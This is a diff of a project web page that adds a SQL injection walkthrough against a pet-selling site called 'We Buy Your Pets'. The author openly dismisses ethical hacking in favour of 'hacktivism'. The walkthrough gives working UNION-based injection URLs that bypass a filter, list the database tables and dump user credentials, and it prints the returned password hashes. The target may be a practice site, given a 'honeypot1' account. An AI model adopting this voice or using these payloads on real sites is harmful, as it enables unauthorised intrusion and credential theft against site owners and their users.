@@ -8,6 +8,7 @@
     <link rel="stylesheet" type="text/css" href="stylesheets/github-dark.css" media="screen">
     <link rel="stylesheet" type="text/css" href="stylesheets/print.css" media="print">
 
+
     <title>Webuyyourpets by stevarino</title>
   </head>
 
@@ -36,7 +37,75 @@
 <h2>
 <a id="guide" class="anchor" href="#guide" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Guide</h2>
 
-<p>In progress</p>
+<p>I know we're supposed to be ethical hackers, but forget that. We're breaking a website! Hacktivism ftw! Target: the disgusting website  We Buy Your Pets.</p>
+
+<p style='text-align: center;'><a href='images/overview.png'><img src='images/overview.png' width='300' alt='Overivew image of site' /></a></p>
+
+<h3>Reconnaissance</h3>
+
+<p>The site appears to be a straight-forward Apache/PHP driven website. This was identified by both HTTP headers (Server:Apache) and file extensions (/index.php</code> works).</p>
+
+<p>The site has multiple pages: <ul>
+  <li><code>/index.php</code> - a default front page which takes no arguments</li>
+  <li><code>/pets.php</code> - a page that displays multiple pets, one optional argument "category"</li>
+  <li><code>/pet.php</code> - a page that displays a single pet, one required argument "id"</li>
+  <li><code>/contact.php</code> - contact page, no arguments</li>
+  <li><code>/login.php</code> - login page, POST-based form.</li>
+</ul></p>
+
+<p>I think we should target the <code>/pets.php</code> file as it has the most flexibility. First thing to ascertain, is it vulnerable to SQL injection?</p>
+
+<p>So first we'll modify the category argument from "cat" to "cat' OR 1=1;--" to attempt to disable the category filtering. Did it work?</p>
+
+<p style='text-align: center;'><a href='images/overview.png'><img src='images/filter-disabled.png' width='300' alt='Image showing all animals, not just cats.' /></a></p>
+
+<p>Now that we're sure we've got control, let's clear our pallete with the url <code>/pets.php?category=cat' AND 0=1;--</code>. This clears out all results. The results seem to have three pieces of data: a title, an image, and an id for a url. Let's test this now with the following URL: <code>/pets.php?category=cat' AND 0=1 UNION SELECT 'first', 'second', 'third';--</code></p>
+
+<pre><code>&lt;a href="pet.php?id=first"&gt;
+  &lt;div class="arrival-info"&gt;
+	  &lt;h4&gt;second&lt;/h4&gt;
+  &lt;/div&gt;
+  &lt;img width="250" src="images/third" alt=""&gt;
+&lt;/a&gt;</code></pre>
+
+<p>So the first argument is the  database id for the pet, second is the title, and third is the image. Wonderful, what can we do with this info? How about we list the tables?</p>
+
+<p>Using the url <code>/pets.php?category=cat' AND 0=1 UNION SELECT 0,name,'cat1.jpeg' FROM sqlite_master WHERE type='table';--</code> we can get a  list of all tables on the site (assuming this is an sqlite based database).
+
+<p style='text-align: center;'><a href='images/database-tables.png'><img src='images/database-tables.png' width='300' alt='Database tables!' /></a></p>
+
+<p>So using this method we found a users table! Netx step  is to enumerate all the fields we can think of that could be in that table (username, uname, user, name, pword, password, hash, md5, etc...) until we find what we're looking for. The correct fields turned out to be user and password, so let's target that with the url <code>/pets.php?category=cat' AND 0=1 UNION SELECT 0,name || ':' || password,'cat1.jpeg' FROM users;--</code></p>
+
+<p>This request should result in a username:password type result. And here's what  we got back:</p>
+
+<pre><code>&lt;tr&gt;
+  &lt;td style="padding: 10px;"&gt;
+    &lt;a href="pet.php?id=0"&gt;
+      &lt;div class="arrival-info"&gt;
+        &lt;h4&gt;honeypot1:482c811da5d5b4bc6d497ffa98491e38&lt;/h4&gt;
+      &lt;/div&gt;
+      &lt;img width="250" src="images/cat1.jpeg" alt=""&gt;
+    &lt;/a&gt;
+  &lt;/td&gt;
+  &lt;td style="padding: 10px;"&gt;
+    &lt;a href="pet.php?id=0"&gt;
+      &lt;div class="arrival-info"&gt;
+        &lt;h4&gt;root:5f4dcc3b5aa765d61d8327deb882cf99&lt;/h4&gt;
+      &lt;/div&gt;
+      &lt;img width="250" src="images/cat1.jpeg" alt=""&gt;
+    &lt;/a&gt;
+  &lt;/td&gt;
+  &lt;td style="padding: 10px;"&gt;
+    &lt;a href="pet.php?id=0"&gt;
+      &lt;div class="arrival-info"&gt;
+        &lt;h4&gt;sally:0f359740bd1cda994f8b55330c86d845&lt;/h4&gt;
+      &lt;/div&gt;
+      &lt;img width="250" src="images/cat1.jpeg" alt=""&gt;
+    &lt;/a&gt;
+  &lt;/td&gt;
+&lt;/tr&gt;</code></pre>
+
+<p>So now we have a list of all user accounts and what appears to be the hashes of their passwords. Not too bad for a little injection attack, eh?</p>
 
 <h2>
 <a id="credits" class="anchor" href="#credits" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Credits</h2>
@@ -47,6 +116,6 @@
       </section>
     </div>
 
-    
+
   </body>
 </html>
